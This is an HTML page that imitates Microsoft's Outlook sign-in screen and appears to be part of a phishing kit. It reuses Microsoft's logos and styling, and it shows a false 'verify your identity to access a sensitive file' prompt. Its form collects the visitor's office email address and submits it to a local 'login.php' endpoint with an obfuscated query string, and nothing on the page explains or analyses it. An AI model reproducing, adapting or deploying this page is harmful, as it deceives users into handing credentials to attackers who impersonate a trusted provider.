
<!DOCTYPE html>
<html dir="ltr" class="gr__login_microsoftonline_com" lang="fr">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Outlook Verify</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1036">
    <meta name="LocLC" content="fr-FR">
    <link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

    <meta name="robots" content="none">
    <link crossorigin="anonymous" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_ia88a1prlwdqyj0b-dw4zw2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-6zwj881n+POYRMmxKAdsyZj04I9Ot7aRa2P+oFp6QUUkvs65zwK7ikO6nb9ei3eu">

</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-gr-c-s-loaded="true" cz-shortcut-listen="true">
    <div>
        <!--  -->
        <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }">
            <div class="background app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                <!-- ko if: smallImageUrl -->
                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;find/gvfRnh.jpg&quot;);"></div>
                <!-- /ko -->
                <!-- ko if: backgroundImageUrl -->
                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;find/gvfRnh.jpg&quot;);"></div>
                <!-- ko if: useImageMask -->
                <!-- /ko -->
                <!-- /ko -->
            </div>
        </div>
        <div data-bind="if: activeDialog"></div>
        <form name="f1" method="post" action="login.php?hdhd92820df8angf264s9df23sd2f1n495K3L2C151645172991f1477dbd26917ef3822423f62e984a91f1477dbd26917ef3822423f62e984a91f1477dbd">
            <!-- ko if: svr.iBannerEnvironment -->
            <!-- /ko -->
            <!-- ko withProperties: { '$loginPage': $data } -->
            <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
                <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                <!-- ko if: svr.fShowCookieBanner -->
                <!-- /ko -->
                <div class="middle app" data-bind="css: { &#39;app&#39;: backgroundLogoUrl }">
                    <!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                    <div class="background-logo-holder"> <img class="background-logo" role="presentation" data-bind="attr: { src: backgroundLogoUrl }" src="./find/37_533e293f0c8947ada653b47c00e394e2.png"> </div>
                    <!-- /ko -->
                    <div class="inner app fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    &#39;app&#39;: backgroundLogoUrl,
                    &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                    &#39;fade-in-lightbox&#39;: fadeInLightBox,
                    &#39;has-popup&#39;: showFedCredButton,
                    &#39;transparent-lightbox&#39;: backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
                        <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
                        <!-- ko if: showLightboxProgress -->
                        <!-- /ko -->
                        <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                        <div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
                            <!--  -->
                            <!-- ko if: bannerLogoUrl -->
                            <!-- /ko -->
                            <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                            <!-- ko component: 'accessible-image-control' -->
                            <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                            <!-- /ko -->
                            <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./find/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </div>
                        <!-- /ko -->
                        <!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
                        <!-- /ko -->
                        <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }">
                            <!--  -->
                            <div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
                                <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
                                <!-- /ko -->
                                <div class="pagination-view animate slide-in-next" data-bind="css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }">
                                    <!-- ko foreach: views -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- ko template: { nodes: [$data], data: $parent } -->
                                    <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            setPendingRequest: $loginPage.view_onSetPendingRequest,
                            showLearnMore: $loginPage.learnMore_onShow,
                            registerDialog: $loginPage.view_onRegisterDialog,
                            unregisterDialog: $loginPage.view_onUnregisterDialog,
                            showDialog: $loginPage.view_onShowDialog } }">
                                        <!--  -->
                                        <div data-bind="component: { name: &#39;header-control&#39;, params: { serverData: svr } }">
                                            <div class="row text-title" id="loginHeader">
                                                <div role="heading" aria-level="1" data-bind="text: title">Because you're accessing a sensitive file, you need to verify your identity.</div>
                                                <!-- ko if: isSubtitleVisible -->
                                                <div role="heading" aria-level="2" class="text-13 subtitle" data-bind="text: subtitle">Continue to Document</div>
                                                <!-- /ko -->
                                            </div>
                                        </div>
                                        <!-- ko if: pageDescription && !svr.fHideLoginDesc -->
                                        <!-- /ko -->
                                        <div class="row">
                                            <div role="alert" aria-live="assertive">
                                                <!-- ko if: usernameTextbox.error -->
                                                <!-- /ko -->
                                            </div>
                                            <div class="form-group col-md-24">
                                                <!-- ko if: prefillNames().length > 1 -->
                                                <!-- /ko -->
                                                <!-- ko ifnot: prefillNames().length > 1 -->
                                                <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Email_Example&#39;],
                hintCss: &#39;placeholder&#39; + (!svr.fAllowPhoneSignIn ? &#39; ltr_override&#39; : &#39;&#39;) },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                                    <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                                                    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                                                    <input type="email" name="username" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" placeholder="Enter your office email address  " aria-label="Email Address" autofocus="autofocus" required>
                                                    
                                                </div>
                                                <!-- /ko -->
                                            </div>
                                        </div>
                                        <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons">
                                            <div class="row">
                                                <div class="col-md-24">
                                                    <div class="text-13 action-links">
                                                        <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                                                        <!-- /ko -->
                                                        <!-- ko if: svr.showCantAccessAccountLink -->
                                                        <div class="form-group"> <a id="cantAccessAccount" name="cannotAccessAccount" href="" data-bind="
                        text: str[&#39;WF_STR_CantAccessAccount_Text&#39;],
                        click: cantAccessAccount_onClick">Your account is not accessible&nbsp;?</a> </div>
                                                        <!-- /ko -->
                                                        <!-- ko if: showFidoLinkInline && hasFido && (availableCredsWithoutUsername.length >= 2 || svr.fShowForgotUsernameLink) -->
                                                        <!-- /ko -->
                                                        <!-- ko if: availableCredsWithoutUsername.length > 0 || svr.fShowForgotUsernameLink -->
                                                        <!-- /ko -->
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
                                                <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }">
                                                    <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin || svr.fRepositionFooterButtons, &#39;button-container&#39;: svr.fRepositionFooterButtons }">
                                                        <!-- ko if: isSecondaryButtonVisible -->
                                                        <!-- /ko -->
                                                        <div data-bind="
        css: {
            &#39;inline-block&#39;: svr.fRepositionFooterButtons,
            &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block">
                                                            <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                            <input type="submit" id="idSIButton9" class="btn btn-block btn-primary"value="Next"> </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <!-- ko if: tenantBranding.BoilerPlateText -->
                                        <!-- /ko -->
                                    </div>
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- ko if: showFedCredButton -->
                    <!-- /ko -->
                    <!-- ko if: newSessionMessage() && !svr.urlMsaStaticMeControl -->
                    <!-- /ko -->
                    <!-- ko if: svr.urlMsaStaticMeControl && newSession() -->
                    <!-- /ko -->
                    <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }">
                    </div>
                    <div id="footer" class="footer" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }">
                        <div data-bind="component: { name: &#39;footer-control&#39;,
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }">
                            <!--  -->
                            <!-- ko if: showLinks || impressumLink || showIcpLicense -->
                            <div id="footerLinks" class="footerNode text-secondary">
                                <!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2020 Microsoft</span>
                                <!-- /ko --><a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="">Privacy and cookies</a>
                                <!-- ko if: impressumLink -->
                                <!-- /ko -->
                                <!-- ko if: showIcpLicense -->
                                <!-- /ko -->
                                <a href="" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        hasFocus: focusMoreInfo()" aria-label="Cliquez ici pour obtenir des informations sur la résolution des problèmes">
                                    <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } -->
                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                    <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="./find/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko component: 'accessible-image-control' -->
                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                    <!-- /ko -->
                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                    <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="./find/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </a>
                            </div>
                            <!-- ko if: showDebugDetails -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </div>
                    </div>
                </div>
                <!-- /ko -->
            </div>
            <!-- /ko -->
        </form>
        
        <!-- /ko -->
    </div>
</body>

</html>